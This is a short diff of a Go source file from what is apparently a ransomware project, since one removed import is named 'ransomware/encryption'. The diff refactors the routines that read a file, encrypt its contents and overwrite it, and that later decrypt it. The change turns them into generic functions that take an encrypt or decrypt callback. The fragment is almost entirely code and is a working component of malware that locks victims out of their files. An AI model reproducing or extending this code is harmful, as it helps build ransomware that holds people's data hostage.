@@ -1,9 +1,7 @@
 package io
 
 import (
-	"crypto/rsa"
 	"os"
-	"ransomware/encryption"
 	"strings"
 )
 
@@ -13,7 +11,10 @@ type File struct {
 	Extension string
 }
 
-func (file *File) Encrypt(pubKey *rsa.PublicKey) error {
+func EncryptFile[Key any](
+	file *File,
+	encrypt func([]byte, Key) ([]byte, error),
+	pubKey Key) error {
 
 	osFile, err := os.Open(file.Path)
 	if err != nil {
@@ -24,7 +25,7 @@ func (file *File) Encrypt(pubKey *rsa.PublicKey) error {
 	osFile.Read(buffer)
 	osFile.Close()
 
-	encrypted, err := encryption.RSAAESEncrypt(buffer, pubKey)
+	encrypted, err := encrypt(buffer, pubKey)
 	if err != nil {
 		return err
 	}
@@ -44,7 +45,10 @@ func (file *File) Encrypt(pubKey *rsa.PublicKey) error {
 	return nil
 }
 
-func (file *File) Decrypt(privKey *rsa.PrivateKey) error {
+func DecryptFile[Key any](
+	file *File,
+	decrypt func([]byte, Key) []byte,
+	privKey Key) error {
 
 	split := strings.Split(file.Path, ".")
 
@@ -61,7 +65,7 @@ func (file *File) Decrypt(privKey *rsa.PrivateKey) error {
 
 		osFile.Close()
 
-		decrypted := encryption.RSAAESDecrypt(buffer, privKey)
+		decrypted := decrypt(buffer, privKey)
 
 		osFile, _ = os.Create(file.Path)
 		_, err = osFile.Write(decrypted)
